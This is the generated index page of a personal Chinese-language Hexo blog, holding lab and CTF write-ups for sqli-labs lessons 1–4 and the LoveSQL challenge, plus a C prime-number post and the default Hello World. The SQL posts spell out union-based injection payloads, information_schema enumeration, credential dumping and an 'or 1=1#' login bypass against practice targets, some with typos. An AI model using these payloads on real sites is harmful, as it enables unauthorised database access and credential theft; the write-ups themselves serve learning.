@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://ymmmmmmin.github.io.git/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="YmmmmmmIN">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">YmmmmmmIN</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">博客</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap">
+  
+    <article id="post-sql-labs-1-4" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/01/19/sql-labs-1-4/" class="article-date">
+  	<time datetime="2022-01-19T08:06:47.000Z" itemprop="datePublished">2022-01-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/19/sql-labs-1-4/">
+        sql-labs  1-4
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="sqli-labs-1-4"><a href="#sqli-labs-1-4" class="headerlink" title="sqli-labs  1-4"></a>sqli-labs  1-4</h1><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p><strong>1.经过语句 and 1=2 测试，页面回显正常，所以该地方不是数值查询</strong></p>
+<p><strong>2.接着尝试在id后面加上’，发现页面回显不正常，表示可能存在SQL字符注入</strong></p>
+<p><img src="../images/sqlless-1(3).png" alt="sqlless-1(3)"></p>
+<p><strong>3.在id=1’之后加上–+注释掉，发现页面回显正常，说明这个地方是单引号字符型注入。</strong></p>
+<p><strong>4.使用order by语句判断，该表一共有几列数据</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/sqlless-1(4).png" alt="sqlless-1(4)"></p>
+<p>一直重复到order by 4 时页面回显不正常，说明改表只有三列数据</p>
+<p><img src="../images/sqlless-1(5).png" alt="sqlless-1(5)"></p>
+<p><strong>5.将id=1报错，使用联合查询查看页面是否有显示位置</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/sqlless-1(6).png" alt="sqlless-1(6)"></p>
+<p>发现页面有两个显示位置</p>
+<p><strong>6.利用sql查询语句爆破出库内的数据库名，表民，列名，字段信息</strong></p>
+<p>（1）查询库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="../images/sqlless-1(7).png" alt="sqlless-1(7)"></p>
+<p>（2）猜测数据在security中，查询security中所有的表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/sqlless-1(8).png" alt="sqlless-1(8)"></p>
+<p>（3）猜测数据在表users中，爆破出列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="../images/sqlless-1(9).png" alt="sqlless-1(9)"></p>
+<p>（4）查询数据,得到所有的用户名和密码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>ymm<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(concat_ws(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,id,username,password)) from security.users--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/sqlless-1(10).png" alt="sqlless-1(10)"></p>
+<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p><strong>1.判断是否存在SQL注入和注入类型</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>返回成功</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>返回失败</p>
+<p>判断为数字型注入</p>
+<p><strong>2.接着与Less-1的做法相同，分别爆出数据库名，表名，列名，数据（详细过程参考第一关）</strong></p>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><strong>1.判断是否存在SQL注入和注入类型</strong></p>
+<p>（1）向页面输入？id=1，页面显示正常</p>
+<p><img src="../images/sqlless-3(1).png" alt="sqlless-3(1)"></p>
+<p>（2）尝试加个单引号，页面报错</p>
+<p><img src="../images/sqlless-3(2).png" alt="sqlless-3(2)"></p>
+<p>根据报错信息发现再加个），可能是注入点</p>
+<p>（3）输入?id=1’)–+页面回显正常，说明是以 (‘’) 方式闭合字符串的字符型注入</p>
+<p><img src="../images/sqlless-3(3).png" alt="sqlless-3(3)"></p>
+<p><strong>2.接着与Less-1的做法相同，分别爆出数据库名，表名，列名，数据（详细过程参考第一关）</strong></p>
+<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p><strong>1.判断是否存在SQL注入和注入类型</strong></p>
+<p>与第三关类似</p>
+<p><img src="../images/sqlless-4(3).png" alt="sqlless-4(3)"></p>
+<p>根据报错信息</p>
+<p><img src="../images/sqlless-4(2).png" alt="sqlless-4(2)"></p>
+<p>发现第四关使用的是 (“”) 的方式闭合字符串</p>
+<p><strong>2.接着与Less-1的做法相同，使用联合查询分别爆出数据库名，表名，列名，数据（详细过程参考第一关）</strong></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2/" rel="tag">博客</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-极客大挑战2019-LoveSQL" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/" class="article-date">
+  	<time datetime="2021-11-14T10:33:16.000Z" itemprop="datePublished">2021-11-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/">
+        [极客大挑战2019]LoveSQL
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="极客大挑战2019-LoveSQL-writeup"><a href="#极客大挑战2019-LoveSQL-writeup" class="headerlink" title="[极客大挑战2019]LoveSQL-writeup"></a>[极客大挑战2019]LoveSQL-writeup</h1><h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>打开题目后得到页面</p>
+<p><img src="../images/lovesql%20%E5%BC%80%E5%A7%8B%E9%A1%B5%E9%9D%A2.png" alt="lovesql 开始页面"></p>
+<p>尝试一下输入用户名为1密码为1</p>
+<p><img src="../images/%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E4%B8%BA1.png" alt="用户名密码为1"></p>
+<p>发现用户名和密码输入错误</p>
+<p>接着尝试用户名为1‘ 密码为1</p>
+<p><img src="../images/%E7%94%A8%E6%88%B7%E5%90%8D%E4%B8%BA1%E2%80%98%E5%AF%86%E7%A0%81%E4%B8%BA1.png" alt="用户名为1‘密码为1"></p>
+<p>得到结果，发现回显了sql语句报错，所以username是个注入点</p>
+<p>而且会发现得到的语句中1的后面多了一个单引号使句子报错</p>
+<p>所以是sql单引号闭合的题目</p>
+<p>这时我们可以使用万能密码</p>
+<p>+++</p>
+<p>username:1’ or 1=1#</p>
+<p>password:随便一个数</p>
+<p>+++</p>
+<p>就会得到登入成功界面</p>
+<p><img src="../images/%E7%99%BB%E5%85%A5%E6%88%90%E5%8A%9F%E7%95%8C%E9%9D%A2.png" alt="登入成功界面"></p>
+<p>将得到的password输入flag发现并不是该题的flag</p>
+<p>使用order by语句判断列数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/%E4%BD%BF%E7%94%A8order%20by%20%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B01.png"></p>
+<p>接着同样操作将1改为2，得到相同结果</p>
+<p>之后以此类推</p>
+<p>一直到输入到第4列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by4--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/%E4%BD%BF%E7%94%A8%20order%20by%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B04.png" alt="使用 order by查询列数4"></p>
+<p>得到页面不一样了，发现不存在第4列，所以只存在3列数据</p>
+<p>开始使用联合查询</p>
+<h5 id="1-测试回显点"><a href="#1-测试回显点" class="headerlink" title="1.测试回显点"></a>1.测试回显点</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/%E6%89%BE%E5%88%B0%E5%9B%9E%E6%98%BE%E7%82%B9.png" alt="找到回显点"></p>
+<p>得到回显点为2和3</p>
+<h5 id="2-查询数据库"><a href="#2-查询数据库" class="headerlink" title="2.查询数据库"></a>2.查询数据库</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/%E6%9F%A5%E6%89%BE%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.png" alt="查找数据库名"></p>
+<p>得到数据库名为geek</p>
+<h5 id="3-查询表"><a href="#3-查询表" class="headerlink" title="3.查询表"></a>3.查询表</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/%E6%9F%A5%E8%AF%A2%E8%A1%A8.png" alt="查询表"></p>
+<p>得到了两张表，猜测flag放在l0ve1ysq1表中</p>
+<h5 id="4-查询字段"><a href="#4-查询字段" class="headerlink" title="4.查询字段"></a>4.查询字段</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>l0ve1ysq1<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p>这里最好使用十六进制，防止报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=0x6c3076653179737131--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5.png" alt="查询字段"></p>
+<h5 id="5-查询数据"><a href="#5-查询数据" class="headerlink" title="5.查询数据"></a>5.查询数据</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; unionn select 1,database(),group_concat(id,username,password) from l0ev1ysq1--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE.png" alt="查询数据"></p>
+<p>得到了一大串数据</p>
+<p>往后翻翻会发现flag</p>
+<p><img src="../images/%E5%BE%97%E5%88%B0flag.png" alt="得到flag"></p>
+<h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p>还在琢磨中……</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2/" rel="tag">博客</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/web%E5%89%8D%E7%AB%AF/">web前端</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-C语言的基础代码（1）" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/27/C%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BB%A3%E7%A0%81%EF%BC%881%EF%BC%89/" class="article-date">
+  	<time datetime="2021-10-27T14:12:29.000Z" itemprop="datePublished">2021-10-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/27/C%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BB%A3%E7%A0%81%EF%BC%881%EF%BC%89/">
+        C语言的基础代码（1）
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="C语言的基础代码（1）"><a href="#C语言的基础代码（1）" class="headerlink" title="C语言的基础代码（1）"></a>C语言的基础代码（1）</h1><p>在c语言中，打印出相同的内容可以写出各种各样的代码。我们可以从简到繁的思路依次看到它多种境界。使用多种循环语句混合及嵌套，结合顺序结构和选择结构，可以编写出效率更高的程序应用。</p>
+<p>​    1.打印3-1000之间的素数</p>
+<p>​       最简单的一种（将这个数x除以小于x且大于1的数，如果不能整除就是素数）：</p>
+<p><img src="../images/%E7%B4%A0%E6%95%B0%E6%99%AE%E9%80%9A%E7%89%88.png" alt="素数普通版"></p>
+<p>​         运行结果：</p>
+<p><img src="../images/%E6%99%AE%E9%80%9A%E7%89%88%E9%80%9F%E5%BA%A6.png" alt="普通版速度"></p>
+<p>进一步的：（减少循环次数）</p>
+<p><img src="../images/%E7%B4%A0%E6%95%B0%E9%AB%98%E6%95%88%E7%89%88.png" alt="素数高效版"></p>
+<p>运行结果：<img src="../images/%E9%AB%98%E6%95%88%E7%89%88%E9%80%9F%E5%BA%A6.png" alt="高效版速度"></p>
+<p>将简单版和进阶版相对比</p>
+<p>很显然，将两者时间进行比较，进阶版所用时间更少，当循环的次数越多所用时间越多，可见合理利用多种循环语句混合及嵌套，结合顺序结构和选择结构，是更高效的。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2/" rel="tag">博客</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/web%E5%89%8D%E7%AB%AF/">web前端</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/18/hello-world/" class="article-date">
+  	<time datetime="2021-09-18T08:49:35.251Z" itemprop="datePublished">2021-09-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/18/hello-world/">
+        Hello World
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Hello-Hexo"><a href="#Hello-Hexo" class="headerlink" title="Hello Hexo"></a>Hello Hexo</h2><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+  
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2022 YmmmmmmIN
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: true,
+		isPost: false,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
